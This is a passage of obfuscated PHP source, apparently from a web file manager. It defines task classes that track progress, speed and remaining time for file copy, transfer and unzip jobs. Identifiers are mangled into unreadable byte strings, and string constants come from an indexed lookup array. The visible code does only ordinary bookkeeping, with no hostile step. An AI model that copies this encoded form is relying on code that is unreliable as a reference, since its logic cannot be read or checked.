self::valueSet($this->task[$Íˆ¤æ±[395]], !1); } $ŒÌÙ§¹ = timeFloat() - $this->task[$Íˆ¤æ±[788]]; self::log($Íˆ¤æ±[1592] . $this->task[$Íˆ¤æ±[395]] . $Íˆ¤æ±[1593] . $ŒÌÙ§¹ . $Íˆ¤æ±[1594]); Hook::unbind($Íˆ¤æ±[1543], array($this, $Íˆ¤æ±[1588])); Hook::unbind($Íˆ¤æ±[1589], array($this, $Íˆ¤æ±[1590])); $this->endAfter(); $this->task = !1; } public function update($îâÄš¿ = 0, $œ›ß¶Ş« = false) { $š¹¨ ÕÉ =& $_SERVER[Ù×¯Ø…]; $Áš§Ä§Â =& $this->task; if (!$Áš§Ä§Â) { return; } $Áš§Ä§Â[$š¹¨ ÕÉ[1581]] += $îâÄš¿; $Áš§Ä§Â[$š¹¨ ÕÉ[787]] = timeFloat(); if ($Áš§Ä§Â[$š¹¨ ÕÉ[1059]]) { if ($Áš§Ä§Â[$š¹¨ ÕÉ[1059]] < $Áš§Ä§Â[$š¹¨ ÕÉ[1581]]) { $Áš§Ä§Â[$š¹¨ ÕÉ[1059]] = $Áš§Ä§Â[$š¹¨ ÕÉ[1581]]; } $¤ÆôÖ“ö = timeFloat() - $Áš§Ä§Â[$š¹¨ ÕÉ[788]] - $Áš§Ä§Â[$š¹¨ ÕÉ[1585]]; $Áš§Ä§Â[$š¹¨ ÕÉ[1582]] = $Áš§Ä§Â[$š¹¨ ÕÉ[1581]] / $Áš§Ä§Â[$š¹¨ ÕÉ[1059]]; $Áš§Ä§Â[$š¹¨ ÕÉ[1583]] = $Áš§Ä§Â[$š¹¨ ÕÉ[1581]] / $¤ÆôÖ“ö; if ($Áš§Ä§Â[$š¹¨ ÕÉ[1582]] > 0) { $Áš§Ä§Â[$š¹¨ ÕÉ[1586]] = $¤ÆôÖ“ö * (1 - $Áš§Ä§Â[$š¹¨ ÕÉ[1582]]) / $Áš§Ä§Â[$š¹¨ ÕÉ[1582]]; } $Áš§Ä§Â[$š¹¨ ÕÉ[1586]] = $Áš§Ä§Â[$š¹¨ ÕÉ[1586]] <= 0 ? 0 : $Áš§Ä§Â[$š¹¨ ÕÉ[1586]]; } $this->updateAfter(); $å´Î²¶ = 0.2; if (timeFloat() - $Áš§Ä§Â[$š¹¨ ÕÉ[1584]] < $å´Î²¶ && !$œ›ß¶Ş«) { return; } $­ªÄñ¸· = self::get($Áš§Ä§Â[$š¹¨ ÕÉ[395]]); $¿êçÄ‘î = $­ªÄñ¸·[$š¹¨ ÕÉ[749]]; if ($¿êçÄ‘î == self::STATYS_KILL) { $¢ºÍè®” = array($š¹¨ ÕÉ[1595] => LNG($š¹¨ ÕÉ[1596]), $š¹¨ ÕÉ[1121] => !1); Cache::set($š¹¨ ÕÉ[1597] . $this->task[$š¹¨ ÕÉ[395]], $¢ºÍè®”, 30); $this->onKill(); $this->end(); die; } else { if ($¿êçÄ‘î == self::STATYS_STOP) { $ªï¶ñ† = 2; $­ªÄñ¸·[$š¹¨ ÕÉ[1585]] += $ªï¶ñ†; self::valueSet($Áš§Ä§Â[$š¹¨ ÕÉ[395]], $­ªÄñ¸·); sleep($ªï¶ñ†); $this->update(); return; } } $Áš§Ä§Â[$š¹¨ ÕÉ[749]] = $¿êçÄ‘î ? $¿êçÄ‘î : $Áš§Ä§Â[$š¹¨ ÕÉ[749]]; $Áš§Ä§Â[$š¹¨ ÕÉ[1585]] = $­ªÄñ¸·[$š¹¨ ÕÉ[1585]] ? $­ªÄñ¸·[$š¹¨ ÕÉ[1585]] : 0; $Áš§Ä§Â[$š¹¨ ÕÉ[1584]] = timeFloat(); Hook::trigger($š¹¨ ÕÉ[1598], $Áš§Ä§Â); self::valueSet($Áš§Ä§Â[$š¹¨ ÕÉ[395]], $Áš§Ä§Â); } public function onKillSet($şç¥îÕœ, $ïÂ×ÖÚŸ = array()) { $this->onKillCall = array($şç¥îÕœ, $ïÂ×ÖÚŸ); } public function onKill() { $¤§ôûó =& $_SERVER[Ù×¯Ø…]; self::log($¤§ôûó[1592] . $this->task[$¤§ôûó[395]] . $¤§ôûó[1599]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($îÖŸÍ™) { $¨â½¹Õ =& $_SERVER[Ù×¯Ø…]; Cache::set($¨â½¹Õ[1597] . $this->task[$¨â½¹Õ[395]], $îÖŸÍ™, 60); return $îÖŸÍ™; } public static function get($ƒùÅ™ğù) { $ú×ïŒ¿© =& $_SERVER[Ù×¯Ø…]; $²É™î• = self::valueGet($ƒùÅ™ğù); if (is_array($²É™î•) && $²É™î•[$ú×ïŒ¿©[1600]]) { $ûÅ®ÌÚ = ActionApply($²É™î•[$ú×ïŒ¿©[1600]], array($²É™î•)); $²É™î• = is_array($ûÅ®ÌÚ) ? $ûÅ®ÌÚ : $²É™î•; } return $²É™î•; } public static function listData() { $Ñ±ÇÃ = self::valueGet(); return array_sort_by($Ñ±ÇÃ, $_SERVER[Ù×¯Ø…][788], !0); } public static function kill($ï–ï¥˜ì) { return self::changeStatus($ï–ï¥˜ì, self::STATYS_KILL); } public static function stop($¡¿‘Á†) { return self::changeStatus($¡¿‘Á†, self::STATYS_STOP); } public static function restart($¢¾œÄ) { return self::changeStatus($¢¾œÄ, self::STATYS_RUNNING); } public static function killAll() { $ÛÉˆìÎØ =& $_SERVER[Ù×¯Ø…]; $ÔßûÎ¯™ = self::listData(); foreach ($ÔßûÎ¯™ as $Ğâ¡Ù÷¶) { self::kill($Ğâ¡Ù÷¶[$ÛÉˆìÎØ[395]]); } sleep(2); foreach ($ÔßûÎ¯™ as $Ğâ¡Ù÷¶) { self::valueSet($Ğâ¡Ù÷¶[$ÛÉˆìÎØ[395]], !1); } } private static function changeStatus($üäî´‚İ, $£ù›Ö¢Æ) { $öïúÙ¥ =& $_SERVER[Ù×¯Ø…]; $úø’ù = self::valueGet($üäî´‚İ); if (!$úø’ù) { return !1; } $úø’ù[$öïúÙ¥[749]] = $£ù›Ö¢Æ; self::valueSet($üäî´‚İ, $úø’ù); self::log($öïúÙ¥[1601] . $úø’ù[$öïúÙ¥[395]] . $öïúÙ¥[1602] . $£ù›Ö¢Æ); return !0; } public static function valueGet($£Ó—‡Æë = false) { $´ŒÍÛ†¯ =& $_SERVER[Ù×¯Ø…]; if ($£Ó—‡Æë) { $Í…ñ¤ƒ— = Model($´ŒÍÛ†¯[448])->where(array($´ŒÍÛ†¯[93] => $£Ó—‡Æë, $´ŒÍÛ†¯[29] => $´ŒÍÛ†¯[1603]))->find(); return $Í…ñ¤ƒ— ? json_decode($Í…ñ¤ƒ—[$´ŒÍÛ†¯[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($±ã”™ß„ = false) { $Ë’õÃ¡Î =& $_SERVER[Ù×¯Ø…]; $úºìòîÚ = array($Ë’õÃ¡Î[29] => $Ë’õÃ¡Î[1603]); if ($±ã”™ß„) { $úºìòîÚ[$Ë’õÃ¡Î[1580]] = $±ã”™ß„; } $‹­Â¦Ê² = Model($Ë’õÃ¡Î[448])->where($úºìòîÚ)->select(); $‹­Â¦Ê² = $‹­Â¦Ê² ? $‹­Â¦Ê² : array(); foreach ($‹­Â¦Ê² as $¡Û»›™ş => $ŸØø¾àÛ) { $‹­Â¦Ê²[$¡Û»›™ş] = json_decode($ŸØø¾àÛ[$Ë’õÃ¡Î[372]], !0); } return $‹­Â¦Ê²; } public static function valueSet($·ôµö™ó, $·ÛŒ¦‡Å) { $•¼é¤ÁÃ =& $_SERVER[Ù×¯Ø…]; if (!$·ÛŒ¦‡Å) { return Model($•¼é¤ÁÃ[448])->where(array($•¼é¤ÁÃ[93] => $·ôµö™ó, $•¼é¤ÁÃ[29] => $•¼é¤ÁÃ[1603]))->delete(); } $„ª…”äÄ = json_encode($·ÛŒ¦‡Å); if (!$„ª…”äÄ) { ob_start(); var_dump($·ÛŒ¦‡Å); $§ƒ«áŞ = ob_get_clean(); self::log($•¼é¤ÁÃ[1604] . json_encode_force($§ƒ«áŞ)); } if (!$·ôµö™ó || !$·ÛŒ¦‡Å[$•¼é¤ÁÃ[395]]) { return !1; } $Œ‘Ãõ = array($•¼é¤ÁÃ[29] => $•¼é¤ÁÃ[1603], $•¼é¤ÁÃ[1580] => USER_ID, $•¼é¤ÁÃ[93] => $·ôµö™ó, $•¼é¤ÁÃ[372] => $„ª…”äÄ); $÷éÃÑÊË = $•¼é¤ÁÃ[1605]; CacheLock::lock($÷éÃÑÊË); Model($•¼é¤ÁÃ[448])->add($Œ‘Ãõ, array(), !0); CacheLock::unlock($÷éÃÑÊË); } public static function log($«¯í»‚) { if (!GLOBAL_DEBUG) { return; } write_log($«¯í»‚, $_SERVER[Ù×¯Ø…][1606]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¡ĞñóÆË =& $_SERVER[Ù×¯Ø…]; $ëüöŠú =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¡ĞñóÆË[1607], array($this, $¡ĞñóÆË[1608])); Hook::bind($¡ĞñóÆË[1145], array($this, $¡ĞñóÆË[1609])); Hook::bind($¡ĞñóÆË[1610], array($this, $¡ĞñóÆË[1611])); Hook::bind($¡ĞñóÆË[601], array($this, $¡ĞñóÆË[1612])); Hook::bind($¡ĞñóÆË[602], array($this, $¡ĞñóÆË[1613])); Hook::bind($¡ĞñóÆË[604], array($this, $¡ĞñóÆË[1614])); Hook::bind($¡ĞñóÆË[605], array($this, $¡ĞñóÆË[1614])); Hook::bind($¡ĞñóÆË[571], array($this, $¡ĞñóÆË[1615])); Hook::bind($¡ĞñóÆË[568], array($this, $¡ĞñóÆË[1615])); Hook::bind($¡ĞñóÆË[573], array($this, $¡ĞñóÆË[1615])); Hook::bind($¡ĞñóÆË[575], array($this, $¡ĞñóÆË[1615])); Hook::bind($¡ĞñóÆË[577], array($this, $¡ĞñóÆË[1615])); Hook::bind($¡ĞñóÆË[1616], array($this, $¡ĞñóÆË[1617])); Hook::bind($¡ĞñóÆË[594], array($this, $¡ĞñóÆË[1618])); $this->sourceModelCopyFlag = !1; Hook::bind($¡ĞñóÆË[1619], array($this, $¡ĞñóÆË[1620])); Hook::bind($¡ĞñóÆË[1621], array($this, $¡ĞñóÆË[1622])); Hook::bind($¡ĞñóÆË[1623], array($this, $¡ĞñóÆË[1624])); $ëüöŠú[$¡ĞñóÆË[1625]] = LNG($¡ĞñóÆË[1626]); $ëüöŠú[$¡ĞñóÆË[1627]] = 0; $ëüöŠú[$¡ĞñóÆË[1628]] = 0; $ëüöŠú[$¡ĞñóÆË[1061]] = $¡ĞñóÆË[33]; $ëüöŠú[$¡ĞñóÆË[1629]] = $¡ĞñóÆË[33]; $ëüöŠú[$¡ĞñóÆË[1630]] = 0; $ëüöŠú[$¡ĞñóÆË[1631]] = 0; $ëüöŠú[$¡ĞñóÆË[1632]] = 0; if (!$ëüöŠú[$¡ĞñóÆË[1479]]) { $ëüöŠú[$¡ĞñóÆË[1479]] = LNG($¡ĞñóÆË[1633]); } } protected function endAfter() { $¤ôëßˆ— =& $_SERVER[Ù×¯Ø…]; Hook::unbind($¤ôëßˆ—[1607], array($this, $¤ôëßˆ—[1608])); Hook::unbind($¤ôëßˆ—[1145], array($this, $¤ôëßˆ—[1609])); Hook::unbind($¤ôëßˆ—[1610], array($this, $¤ôëßˆ—[1611])); Hook::unbind($¤ôëßˆ—[601], array($this, $¤ôëßˆ—[1612])); Hook::unbind($¤ôëßˆ—[602], array($this, $¤ôëßˆ—[1613])); Hook::unbind($¤ôëßˆ—[604], array($this, $¤ôëßˆ—[1614])); Hook::unbind($¤ôëßˆ—[605], array($this, $¤ôëßˆ—[1614])); Hook::unbind($¤ôëßˆ—[571], array($this, $¤ôëßˆ—[1615])); Hook::unbind($¤ôëßˆ—[568], array($this, $¤ôëßˆ—[1615])); Hook::unbind($¤ôëßˆ—[573], array($this, $¤ôëßˆ—[1615])); Hook::unbind($¤ôëßˆ—[575], array($this, $¤ôëßˆ—[1615])); Hook::unbind($¤ôëßˆ—[577], array($this, $¤ôëßˆ—[1615])); Hook::unbind($¤ôëßˆ—[1616], array($this, $¤ôëßˆ—[1617])); Hook::unbind($¤ôëßˆ—[594], array($this, $¤ôëßˆ—[1618])); Hook::unbind($¤ôëßˆ—[1619], array($this, $¤ôëßˆ—[1620])); Hook::unbind($¤ôëßˆ—[1621], array($this, $¤ôëßˆ—[1622])); Hook::unbind($¤ôëßˆ—[1623], array($this, $¤ôëßˆ—[1624])); } public function copyMoveStart($üÖÇÄ‘¶, $£ÕŸ‚ÀÁ, $š€õÍèÏ, $‘öïÒ­¢) { $Ò×š’Õ€ =& $_SERVER[Ù×¯Ø…]; self::log($Ò×š’Õ€[1634] . $£ÕŸ‚ÀÁ . $Ò×š’Õ€[67] . $‘öïÒ­¢); $Š›¼›êè = rtrim(TEMP_FILES, $Ò×š’Õ€[8]); if (substr($£ÕŸ‚ÀÁ, 0, strlen($Š›¼›êè)) == $Š›¼›êè) { return; } if (substr($‘öïÒ­¢, 0, strlen($Š›¼›êè)) == $Š›¼›êè) { return; } $¥éÏÌ¤ =& $this->task; $¥éÏÌ¤[$Ò×š’Õ€[1635]] = KodIO::transferType($üÖÇÄ‘¶, $š€õÍèÏ); $this->update(); } public function updateAfter() { $À‰ïŞŸı =& $_SERVER[Ù×¯Ø…]; $Û¢³ªÉ¡ =& $this->task; if (!$Û¢³ªÉ¡[$À‰ïŞŸı[762]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Û¢³ªÉ¡[$À‰ïŞŸı[1635]] == $À‰ïŞŸı[1230]) { return; } self::updateTask($Û¢³ªÉ¡); } private static function updateTask(&$ú·š¶ö) { $ıìš¼­µ =& $_SERVER[Ù×¯Ø…]; if ($ú·š¶ö[$ıìš¼­µ[1635]] == $ıìš¼­µ[1129] || $ú·š¶ö[$ıìš¼­µ[1635]] == $ıìš¼­µ[107]) { if ($ú·š¶ö[$ıìš¼­µ[1629]]) { $ú·š¶ö[$ıìš¼­µ[1632]] = $ú·š¶ö[$ıìš¼­µ[1631]] + $ú·š¶ö[$ıìš¼­µ[1628]]; } } else { if ($ú·š¶ö[$ıìš¼­µ[1635]] == $ıìš¼­µ[1231]) { if ($ú·š¶ö[$ıìš¼­µ[1629]] == $ıìš¼­µ[1129]) { $ú·š¶ö[$ıìš¼­µ[1632]] = $ú·š¶ö[$ıìš¼­µ[1631]] + $ú·š¶ö[$ıìš¼­µ[1628]] * 0.5; } else { if ($ú·š¶ö[$ıìš¼­µ[1629]] == $ıìš¼­µ[107]) { $ú·š¶ö[$ıìš¼­µ[1632]] = $ú·š¶ö[$ıìš¼­µ[1631]] + $ú·š¶ö[$ıìš¼­µ[1627]] * 0.5 + $ú·š¶ö[$ıìš¼­µ[1628]] * 0.5; } } } } $ú·š¶ö[$ıìš¼­µ[1582]] = $ú·š¶ö[$ıìš¼­µ[1632]] / $ú·š¶ö[$ıìš¼­µ[762]]; if ($ú·š¶ö[$ıìš¼­µ[1582]] > 0) { $˜ÎœĞÀ = timeFloat() - $ú·š¶ö[$ıìš¼­µ[788]] - $ú·š¶ö[$ıìš¼­µ[1585]]; $ú·š¶ö[$ıìš¼­µ[1586]] = $˜ÎœĞÀ * (1 - $ú·š¶ö[$ıìš¼­µ[1582]]) / $ú·š¶ö[$ıìš¼­µ[1582]]; } } public function addPath($ı±†óô±) { $®‹µø¿Á =& $_SERVER[Ù×¯Ø…]; if (!$ı±†óô±) { return; } $º‘³üÂÑ =& $this->task; $Œñ÷şíœ = IO::infoWithChildren($ı±†óô±); $öÚ—†¶ = $º‘³üÂÑ[$®‹µø¿Á[1636]] ? $º‘³üÂÑ[$®‹µø¿Á[1636]][$®‹µø¿Á[1637]] : 0; $º‘³üÂÑ[$®‹µø¿Á[1636]] = array($®‹µø¿Á[1637] => $öÚ—†¶ + 1, $®‹µø¿Á[424] => $Œñ÷şíœ[$®‹µø¿Á[28]], $®‹µø¿Á[76] => $Œñ÷şíœ[$®‹µø¿Á[76]], $®‹µø¿Á[522] => $Œñ÷şíœ[$®‹µø¿Á[522]] ? $Œñ÷şíœ[$®‹µø¿Á[522]] : $Œñ÷şíœ[$®‹µø¿Á[76]]); if ($Œñ÷şíœ[$®‹µø¿Á[29]] == $®‹µø¿Á[193]) { $º‘³üÂÑ[$®‹µø¿Á[1059]] += 1; } else { $º‘³üÂÑ[$®‹µø¿Á[1059]] += $Œñ÷şíœ[$®‹µø¿Á[81]][$®‹µø¿Á[79]]; if ($Œñ÷şíœ[$®‹µø¿Á[406]]) { $º‘³üÂÑ[$®‹µø¿Á[1059]] += $Œñ÷şíœ[$®‹µø¿Á[81]][$®‹µø¿Á[80]] + 1; } } $º‘³üÂÑ[$®‹µø¿Á[762]] += $Œñ÷şíœ[$®‹µø¿Á[78]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($ÂŞı¤‡Ì) { $Ğ«ÚÒ¬ô =& $_SERVER[Ù×¯Ø…]; $’Å×Ñ‡„ =& $this->task; $’Å×Ñ‡„[$Ğ«ÚÒ¬ô[1625]] = $ÂŞı¤‡Ì[$Ğ«ÚÒ¬ô[28]]; $’Å×Ñ‡„[$Ğ«ÚÒ¬ô[1061]] = $ÂŞı¤‡Ì[$Ğ«ÚÒ¬ô[28]]; $this->update(); } public function copyFileStart($­¼Ì‡ı‡, $ò¿´Ï†Ä, $°ÇÖÌùú, $Ûû™‡ª§, $úİù¥‡í, $õ¦È“¤Ï) { $Êœ£ÊÉÛ =& $_SERVER[Ù×¯Ø…]; $£ÅÚóßè = $úİù¥‡í; if ($£ÅÚóßè == $GLOBALS[$Êœ£ÊÉÛ[1638]]) { $£ÅÚóßè = $GLOBALS[$Êœ£ÊÉÛ[1639]]; } $GLOBALS[$Êœ£ÊÉÛ[1639]] = $úİù¥‡í; $GLOBALS[$Êœ£ÊÉÛ[1638]] = $õ¦È“¤Ï; $ÊÄ”ÆÎÓ =& $this->task; $ÊÄ”ÆÎÓ[$Êœ£ÊÉÛ[1625]] = $£ÅÚóßè; $ÊÄ”ÆÎÓ[$Êœ£ÊÉÛ[1627]] = (int) $­¼Ì‡ı‡->size($ò¿´Ï†Ä); $ÊÄ”ÆÎÓ[$Êœ£ÊÉÛ[1628]] = 0; $ÊÄ”ÆÎÓ[$Êœ£ÊÉÛ[1061]] = $Êœ£ÊÉÛ[33]; $ÊÄ”ÆÎÓ[$Êœ£ÊÉÛ[1629]] = $Êœ£ÊÉÛ[33]; $ÊÄ”ÆÎÓ[$Êœ£ÊÉÛ[1630]] = 0; $Ò­­ì½‘ = $ÊÄ”ÆÎÓ[$Êœ£ÊÉÛ[1627]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ÊÄ”ÆÎÓ[$Êœ£ÊÉÛ[395]] . $Êœ£ÊÉÛ[1640]); if ($Ò­­ì½‘ && file_exists(get_path_father($Ûû™‡ª§))) { Cache::set($ÊÄ”ÆÎÓ[$Êœ£ÊÉÛ[395]] . $Êœ£ÊÉÛ[1640], $Ûû™‡ª§); $ÊÄ”ÆÎÓ[$Êœ£ÊÉÛ[1600]] = array($Êœ£ÊÉÛ[1641], $Êœ£ÊÉÛ[1642]); } $this->update(0, $Ò­­ì½‘); } public static function updateCopyLocalFileSize($´¾Ù¬Ó˜) { $×ì”Úª =& $_SERVER[Ù×¯Ø…]; $á†ªÊÀ¿ = Cache::get($´¾Ù¬Ó˜[$×ì”Úª[395]] . $×ì”Úª[1640]); if (!$á†ªÊÀ¿ || !file_exists($á†ªÊÀ¿)) { return $´¾Ù¬Ó˜; } $´¾Ù¬Ó˜[$×ì”Úª[1628]] = @filesize($á†ªÊÀ¿); $´¾Ù¬Ó˜[$×ì”Úª[1632]] += $´¾Ù¬Ó˜[$×ì”Úª[1628]]; self::updateTask($´¾Ù¬Ó˜); return $´¾Ù¬Ó˜; } public function copyFileEnd($¥Æ›ï¢Ä, $³ÑŠ ¿, $Ş…½«Î, $—Â·Ğ£Ê, $’ëˆœ‘Æ, $ééÈş¢) { $Œ‹şİ¬ê =& $_SERVER[Ù×¯Ø…]; $š¯Èš¥à =& $this->task; $š¯Èš¥à[$Œ‹şİ¬ê[1628]] = $š¯Èš¥à[$Œ‹şİ¬ê[1627]]; $š¯Èš¥à[$Œ‹şİ¬ê[1629]] = $Œ‹şİ¬ê[33]; unset($š¯Èš¥à[$Œ‹şİ¬ê[1600]]); if ($’ëˆœ‘Æ == $š¯Èš¥à[$Œ‹şİ¬ê[1625]]) { $š¯Èš¥à[$Œ‹şİ¬ê[1631]] += $š¯Èš¥à[$Œ‹şİ¬ê[1627]]; $š¯Èš¥à[$Œ‹şİ¬ê[1632]] = $š¯Èš¥à[$Œ‹şİ¬ê[1631]]; $this->update(1); } else { $this->update(); $š¯Èš¥à[$Œ‹şİ¬ê[1628]] = 0; } Cache::remove($š¯Èš¥à[$Œ‹şİ¬ê[395]] . $Œ‹şİ¬ê[1640]); self::log($Œ‹şİ¬ê[1643] . $³ÑŠ ¿ . $Œ‹şİ¬ê[67] . $—Â·Ğ£Ê . $Œ‹şİ¬ê[229] . $’ëˆœ‘Æ . $Œ‹şİ¬ê[1644] . $š¯Èš¥à[$Œ‹şİ¬ê[1625]]); } public function updateFileEnd($ŸĞùêÕô, $ˆ”ƒö‰) { $¾‹ÏÌÛ =& $_SERVER[Ù×¯Ø…]; $§¸ë«Ÿå =& $this->task; $§¸ë«Ÿå[$¾‹ÏÌÛ[1625]] = $ŸĞùêÕô; $§¸ë«Ÿå[$¾‹ÏÌÛ[1627]] = $ˆ”ƒö‰; $§¸ë«Ÿå[$¾‹ÏÌÛ[1631]] += $ˆ”ƒö‰; $§¸ë«Ÿå[$¾‹ÏÌÛ[1632]] = $§¸ë«Ÿå[$¾‹ÏÌÛ[1631]]; $this->update(1); self::log($¾‹ÏÌÛ[1645] . $ŸĞùêÕô); } public function sourceModelCopy($ ÑÙ÷ãµ) { $ƒìá»ú¦ =& $_SERVER[Ù×¯Ø…]; $ù¡Š½€ = $ ÑÙ÷ãµ[0]; $ª˜‡İıó = $ ÑÙ÷ãµ[1]; $Ğ™¡ÃèŸ =& $this->task; $this->sourceModelCopyFlag = !0; $êæ§ í™ = 0; switch ($ù¡Š½€) { case $ƒìá»ú¦[569]: $êæ§ í™ = 1; break; case $ƒìá»ú¦[572]: $Ğ™¡ÃèŸ[$ƒìá»ú¦[1625]] = $ª˜‡İıó[$ƒìá»ú¦[28]]; break; case $ƒìá»ú¦[574]: $êæ§ í™ = intval($ ÑÙ÷ãµ[$ƒìá»ú¦[378]] * 0.4); break; case $ƒìá»ú¦[576]: $êæ§ í™ = intval($ ÑÙ÷ãµ[$ƒìá»ú¦[378]] * 0.2); break; case $ƒìá»ú¦[578]: $êæ§ í™ = intval($ ÑÙ÷ãµ[$ƒìá»ú¦[378]] * 0.4); break; } $this->update($êæ§ í™); $this->sourceModelCopyFlag = !1; } public function sourceRemove($í±ø‚óŞ, $ É£û¢) { $Ï´êÌÍà =& $_SERVER[Ù×¯Ø…]; $this->sourceModelCopyFlag = !0; $”ÍÆÖ«… = 1; if (isset($í±ø‚óŞ[$Ï´êÌÍà[81]])) { $”ÍÆÖ«… = $í±ø‚óŞ[$Ï´êÌÍà[81]][$Ï´êÌÍà[79]] + $í±ø‚óŞ[$Ï´êÌÍà[81]][$Ï´êÌÍà[80]] + 1; } $this->update($”ÍÆÖ«…); $this->sourceModelCopyFlag = !1; } public function sourceMove($³­õæµ·) { $this->sourceRemove($³­õæµ·, !1); } public function curlProgress($äºÊöŠ‡, $¼àÒÆƒ§, $¾Ã¶¼üÔ, $°³ À, $è–Ğò¸ ) { $ÂæÑôï® =& $_SERVER[Ù×¯Ø…]; $­•ûñ¶ =& $this->task; if ($è–Ğò¸  > 0) { $­•ûñ¶[$ÂæÑôï®[1061]] = $ÂæÑôï®[1646]; $­•ûñ¶[$ÂæÑôï®[1629]] = $ÂæÑôï®[107]; if ($­•ûñ¶[$ÂæÑôï®[1627]]) { $­•ûñ¶[$ÂæÑôï®[1628]] = $è–Ğò¸ ; } if ($­•ûñ¶[$ÂæÑôï®[1630]]) { $­•ûñ¶[$ÂæÑôï®[1628]] = $è–Ğò¸  + $­•ûñ¶[$ÂæÑôï®[1630]]; } } else { if ($¾Ã¶¼üÔ > 0) { if ($­•ûñ¶[$ÂæÑôï®[1627]] == $¼àÒÆƒ§) { $­•ûñ¶[$ÂæÑôï®[1628]] = $¾Ã¶¼üÔ; $­•ûñ¶[$ÂæÑôï®[1061]] = $ÂæÑôï®[1647]; $­•ûñ¶[$ÂæÑôï®[1629]] = $ÂæÑôï®[1129]; } } } $this->update(); } public function curlProgressStart($Ôı£‡Ã¨) { } public function curlProgressEnd($¾¢ÛÉŞ) { $¤®®—“Ó =& $_SERVER[Ù×¯Ø…]; $•ù÷¢ÚÁ =& $this->task; $‘Ÿ•Ôåù = curl_getinfo($¾¢ÛÉŞ); $Ë„ÒéŒ  = $‘Ÿ•Ôåù[$¤®®—“Ó[1648]]; if ($Ë„ÒéŒ  == -1) { $Ë„ÒéŒ  = $‘Ÿ•Ôåù[$¤®®—“Ó[1649]]; } if ($•ù÷¢ÚÁ[$¤®®—“Ó[1629]] == $¤®®—“Ó[107] && $Ë„ÒéŒ ) { $•ù÷¢ÚÁ[$¤®®—“Ó[1630]] += $Ë„ÒéŒ ; } $this->update(); } } goto d³æ™˜•’; f®¡ƒÍ»ä: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ñÏ“ÔìÛ =& $_SERVER[Ù×¯Ø…]; parent::startAfter(); Hook::bind($ñÏ“ÔìÛ[1668], array($this, $ñÏ“ÔìÛ[1669])); Hook::bind($ñÏ“ÔìÛ[1124], array($this, $ñÏ“ÔìÛ[1670])); $òê·µ¨ =& $this->task; $òê·µ¨[$ñÏ“ÔìÛ[1671]] = $ñÏ“ÔìÛ[1129]; if (!$òê·µ¨[$ñÏ“ÔìÛ[1479]]) { $òê·µ¨[$ñÏ“ÔìÛ[1479]] = LNG($ñÏ“ÔìÛ[1672]); } } protected function endAfter() { $ËƒÅö’£ =& $_SERVER[Ù×¯Ø…]; parent::endAfter(); Hook::unbind($ËƒÅö’£[1668], array($this, $ËƒÅö’£[1669])); Hook::unbind($ËƒÅö’£[1124], array($this, $ËƒÅö’£[1670])); } public function updateAfter() { $†ÌÂ˜Å =& $_SERVER[Ù×¯Ø…]; $îšß¦»ä =& $this->task; if (!$îšß¦»ä[$†ÌÂ˜Å[1059]] || !$îšß¦»ä[$†ÌÂ˜Å[762]]) { return; } if ($îšß¦»ä[$†ÌÂ˜Å[1671]] == $†ÌÂ˜Å[1129]) { $‘ØßÛìÕ = 0; if ($îšß¦»ä[$†ÌÂ˜Å[1627]]) { $‘ØßÛìÕ = $îšß¦»ä[$†ÌÂ˜Å[1628]] / $îšß¦»ä[$†ÌÂ˜Å[1627]]; } $îšß¦»ä[$†ÌÂ˜Å[1582]] = $‘ØßÛìÕ * 0.3; } else { if ($îšß¦»ä[$†ÌÂ˜Å[1671]] == $†ÌÂ˜Å[311]) { $‘ØßÛìÕ = $îšß¦»ä[$†ÌÂ˜Å[1581]] / $îšß¦»ä[$†ÌÂ˜Å[1059]]; $îšß¦»ä[$†ÌÂ˜Å[1582]] = 0.3 + $‘ØßÛìÕ * 0.4; } else { if ($îšß¦»ä[$†ÌÂ˜Å[1671]] == $†ÌÂ˜Å[107]) { $ãßôï = 0; if ($îšß¦»ä[$†ÌÂ˜Å[1629]] == $†ÌÂ˜Å[107]) { $ãßôï = $îšß¦»ä[$†ÌÂ˜Å[1628]]; } $‘ØßÛìÕ = ($îšß¦»ä[$†ÌÂ˜Å[1632]] + $ãßôï) / $îšß¦»ä[$†ÌÂ˜Å[762]]; $îšß¦»ä[$†ÌÂ˜Å[1582]] = 0.3 + 0.4 + $‘ØßÛìÕ * 0.3; } } } if ($îšß¦»ä[$†ÌÂ˜Å[1582]] > 0) { $¦ÓìÁş = timeFloat() - $îšß¦»ä[$†ÌÂ˜Å[788]] - $îšß¦»ä[$†ÌÂ˜Å[1585]]; $îšß¦»ä[$†ÌÂ˜Å[1586]] = $¦ÓìÁş * (1 - $îšß¦»ä[$†ÌÂ˜Å[1582]]) / $îšß¦»ä[$†ÌÂ˜Å[1582]]; } } public function addFile($Ïƒâô—‹) { $ø™ôõÖæ =& $_SERVER[Ù×¯Ø…]; $ëÛÚœ”µ =& $this->task; $öÂ¯æÕÃ = IO::info($Ïƒâô—‹); $ëÛÚœ”µ[$ø™ôõÖæ[1625]] = $öÂ¯æÕÃ[$ø™ôõÖæ[28]]; $ëÛÚœ”µ[$ø™ôõÖæ[1627]] = $öÂ¯æÕÃ[$ø™ôõÖæ[78]]; $ëÛÚœ”µ[$ø™ôõÖæ[1628]] = 0; $ëÛÚœ”µ[$ø™ôõÖæ[1061]] = $ø™ôõÖæ[1647]; $ëÛÚœ”µ[$ø™ôõÖæ[1629]] = $ø™ôõÖæ[1129]; $ëÛÚœ”µ[$ø™ôõÖæ[762]] = $öÂ¯æÕÃ[$ø™ôõÖæ[78]]; $ëÛÚœ”µ[$ø™ôõÖæ[1059]] = 1; $Ÿª¸İßì = 0; $ëÛÚœ”µ[$ø™ôõÖæ[1636]] = array($ø™ôõÖæ[1637] => $Ÿª¸İßì + 1, $ø™ôõÖæ[424] => $öÂ¯æÕÃ[$ø™ôõÖæ[28]], $ø™ôõÖæ[76] => $öÂ¯æÕÃ[$ø™ôõÖæ[76]], 